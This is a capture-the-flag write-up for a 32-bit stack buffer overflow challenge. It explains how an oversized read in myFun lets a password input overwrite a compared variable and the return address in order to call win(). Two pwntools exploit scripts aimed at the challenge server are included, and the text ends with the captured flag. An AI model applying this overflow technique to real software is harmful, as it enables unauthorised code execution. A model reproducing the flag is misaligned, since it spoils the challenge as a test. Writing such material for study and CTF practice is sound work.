Challenge Name: Beef-Of-Finitude

To start off, we see a main function which calls function myFun. This functions takes in two inputs (strings), one as name and the other as password. 
An initial variable say var is defined and is equal to 7. i.e var = 0x7 as seen from line 22 in myFun.
The first input and second inputs are 16 bytes long, however, if we look at line 103, we can see a 'push 0x150' command, which suggests that though the size for second input is 16 bytes, its taking 0x150 in total. 
This would mean that there is a chance to overflow the buffer to proceed to line 120, where the var value is compared with 0xdeadbeef and as we know var is stored at ebp-0xc as seen from line 22. 
Hence to satisfy the condition, we need to overflow the password in a way so that, var = 0xdeadbeef. To do that we may use the following code:

from pwn import *
r = remote('challenges.ctfd.io', 30027)

r.recvuntil('Enter your Name:')
r.sendline('shravya')

r.recvuntil('Enter your password:')
r.send('B'*26 + p32(0xdeadbeef))
r.interactive()

Till here we have just overflown the buffer. This allows us into the shell but however to get the flag we may have to call the win() function. 
   
   Thus in order to overflow the buffer at the password, and to call the win() function once the right value is compared at ebp-0xc register, we willnhave to:
   a) rewrite ebp-0xc with p32(0xdeadbeef) since that is what it is compared with,
   b) rewrite the return address stored at eip to that of the win function, 
   c) pass arguments of win function, i.e 
   param_1 = p32(0x14b4da55), param_2 = p32(0x0), param_3 = p32(0x67616c66), param_4 = p32(0x0)
   
   #python program : (cotinuation)
   
   from pwn import *
   r = remote('challenges.ctfd.io', 30027)

   r.recvuntil('Enter your Name:')
   r.sendline('hi')

   r.recvuntil('Enter your password:')
   r.sendline('B'*26 + p32(0xdeadbeef) + 'B'*12 + p32(0x0804923a) + p32(0x0804923a) + p32(0x14b4da55) + p32(0x0) + p32(0x67616c66) + p32(0x0))

   r.interactive()
   
   Flag:
   UDCTF{0bl1g4t0ry_buff3r_ov3rflow}
